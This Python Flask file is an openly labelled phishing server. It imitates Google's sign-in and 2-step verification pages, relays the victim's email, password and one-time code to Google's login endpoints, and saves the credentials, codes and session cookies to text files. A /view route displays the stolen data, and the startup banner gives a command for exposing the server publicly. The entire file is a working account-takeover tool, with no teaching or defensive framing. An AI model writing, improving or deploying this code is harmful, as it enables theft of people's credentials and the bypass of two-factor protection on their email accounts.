from flask import Flask, request, render_template_string, redirect
import requests
from datetime import datetime
import secrets
import re

app = Flask(__name__)

# Session storage
sessions = {}

# Google endpoints
GOOGLE_AUTH = "https://accounts.google.com/ServiceLoginAuth"
GOOGLE_LOGIN = "https://accounts.google.com/ServiceLogin"

# HTML for fake Google login (CORRECT - using real Google's look)
LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 20px; }
        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 75px; height: 75px; }
        .title { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 10px; }
        .subtitle { text-align: center; color: #5f6368; margin-bottom: 25px; }
        .input-group { margin-bottom: 15px; }
        .input-group input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; transition: border 0.2s; }
        .input-group input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 1px 3px rgba(26,115,232,0.3); }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: 500; }
        .btn:hover { background: #1557b0; }
        .footer { text-align: center; margin-top: 20px; font-size: 14px; color: #5f6368; }
        .footer a { color: #1a73e8; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
        .error { color: #d93025; text-align: center; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google">
            </div>
            <h1 class="title">Sign in</h1>
            <p class="subtitle">to continue to Gmail</p>
            <div id="error" class="error">Invalid email or password</div>
            <form method="POST" action="/login">
                <div class="input-group">
                    <input type="email" name="Email" placeholder="Email or phone" required>
                </div>
                <div class="input-group">
                    <input type="password" name="Passwd" placeholder="Password" required>
                </div>
                <button type="submit" class="btn">Next</button>
            </form>
            <div class="footer">
                <a href="#">Create account</a> · <a href="#">Forgot email?</a>
            </div>
        </div>
    </div>
</body>
</html>
'''

# 2FA Page
TFA_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2-Step Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 20px; }
        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 75px; height: 75px; }
        .title { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 10px; }
        .subtitle { text-align: center; color: #5f6368; margin-bottom: 25px; }
        .input-group { margin-bottom: 15px; }
        .input-group input { width: 100%; padding: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 24px; text-align: center; letter-spacing: 8px; }
        .input-group input:focus { border-color: #1a73e8; outline: none; }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: 500; }
        .btn:hover { background: #1557b0; }
        .timer { text-align: center; color: #999; font-size: 12px; margin-top: 15px; }
        .footer { margin-top: 20px; text-align: center; color: #5f6368; font-size: 14px; }
        .footer a { color: #1a73e8; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
            </div>
            <h1 class="title">Verify it's you</h1>
            <p class="subtitle">Enter the verification code from your authenticator app</p>
            <form method="POST" action="/2fa">
                <div class="input-group">
                    <input type="text" name="code" placeholder="000000" maxlength="6" autofocus required>
                </div>
                <button type="submit" class="btn">Verify</button>
            </form>
            <div class="timer" id="timer">Code expires in: 30 seconds</div>
            <div class="footer">
                <a href="#">Try another way</a>
            </div>
        </div>
    </div>
    <script>
        let timeLeft = 30;
        const timer = document.getElementById('timer');
        setInterval(() => {
            timeLeft--;
            timer.textContent = `Code expires in: ${timeLeft} seconds`;
            if (timeLeft <= 0) {
                timer.textContent = 'Code expired!';
                timer.style.color = '#d93025';
            }
        }, 1000);
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    print(f"[+] Visitor at: {datetime.now()}")
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('Email')
    password = request.form.get('Passwd')
    ip = request.remote_addr
    
    print(f"\n[+] LOGIN ATTEMPT")
    print(f"[+] Email: {email}")
    print(f"[+] IP: {ip}")
    
    # Create a persistent session (CRITICAL!)
    session = requests.Session()
    
    # Add proper headers (CRITICAL!)
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://accounts.google.com',
        'Referer': 'https://accounts.google.com/ServiceLogin'
    })
    
    try:
        # First, get the login page to get initial cookies
        initial_page = session.get(GOOGLE_LOGIN)
        
        # Now POST with credentials
        response = session.post(
            GOOGLE_AUTH,
            data={
                'Email': email,
                'Passwd': password,
                'service': 'mail',
                'continue': 'https://mail.google.com'
            },
            allow_redirects=False
        )
        
        # Save credentials
        with open('captured.txt', 'a') as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Email: {email}\n")
            f.write(f"Password: {password}\n")
            f.write(f"IP: {ip}\n")
            f.write(f"Time: {datetime.now()}\n")
            f.write(f"{'='*50}\n")
        
        print(f"[+] Credentials saved")
        
        # Check for 2FA (CORRECT detection)
        if response.status_code == 302:
            location = response.headers.get('Location', '')
            if 'challenge' in location or '2fa' in location:
                # 2FA REQUIRED!
                session_id = secrets.token_hex(16)
                sessions[session_id] = {
                    'session': session,
                    'email': email,
                    'password': password,
                    'cookies': session.cookies.get_dict()
                }
                print(f"[!] 2FA Required! Waiting for code...")
                return render_template_string(TFA_PAGE)
        
        # No 2FA - Session captured!
        cookies = session.cookies.get_dict()
        with open('cookies.txt', 'a') as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Email: {email}\n")
            f.write(f"Cookies: {cookies}\n")
            f.write(f"{'='*50}\n")
        
        print(f"[+] No 2FA - Session captured!")
        print(f"[+] Cookies: {cookies}")
        
        # Redirect to real Gmail
        return redirect('https://mail.google.com')
        
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return f"Error: {str(e)}"

@app.route('/2fa', methods=['POST'])
def two_factor():
    code = request.form.get('code')
    session_id = request.cookies.get('session_id')
    
    if session_id not in sessions:
        return "Session expired. Please try again."
    
    saved = sessions[session_id]
    session = saved['session']
    email = saved['email']
    password = saved['password']
    
    print(f"\n[!] 2FA CODE RECEIVED: {code}")
    
    try:
        # Complete login with 2FA
        response = session.post(
            GOOGLE_AUTH,
            data={
                'Email': email,
                'Passwd': password,
                'service': 'mail',
                'continue': 'https://mail.google.com',
                '2fa_code': code
            },
            allow_redirects=False
        )
        
        # Check success
        if response.status_code == 302 or 'SAPISID' in session.cookies:
            cookies = session.cookies.get_dict()
            
            with open('2fa_success.txt', 'a') as f:
                f.write(f"\n{'='*50}\n")
                f.write(f"EMAIL: {email}\n")
                f.write(f"2FA CODE: {code}\n")
                f.write(f"COOKIES: {cookies}\n")
                f.write(f"TIME: {datetime.now()}\n")
                f.write(f"{'='*50}\n")
            
            print(f"[!!!] FULL ACCESS ACQUIRED!")
            print(f"[!!!] Email: {email}")
            print(f"[!!!] 2FA Code: {code}")
            
            # Clean up
            del sessions[session_id]
            
            return redirect('https://mail.google.com')
        else:
            print(f"[!] 2FA failed")
            return "Invalid code. Try again."
            
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return f"Error: {str(e)}"

@app.route('/view')
def view():
    output = []
    files = ['captured.txt', 'cookies.txt', '2fa_success.txt']
    for f in files:
        try:
            with open(f, 'r') as file:
                output.append(f"\n=== {f} ===\n")
                output.append(file.read())
        except:

            output.append(f"\n=== {f} ===\nNo data yet\n")
    
    return f'<pre style="font-family: monospace; background: #f5f5f5; padding: 20px;">{"".join(output)}</pre>'



if __name__ == '__main__':
    print("\n" + "="*50)
    print("🔐 CORRECTED 2FA PHISHING SERVER")
    print("="*50)
    print("✅ Session preservation - FIXED!")
    print("✅ Proper headers - FIXED!")
    print("✅ Correct 2FA detection - FIXED!")
    print("✅ Handle redirects - FIXED!")
    print("✅ Correct cookie capture - FIXED!")
    print("="*50)
    print("\n[+] Server running on http://localhost:5000")
    print("[+] Expose with: zrok share public http://localhost:5000")
    
    app.run(host='0.0.0.0', port=5000, debug=True)
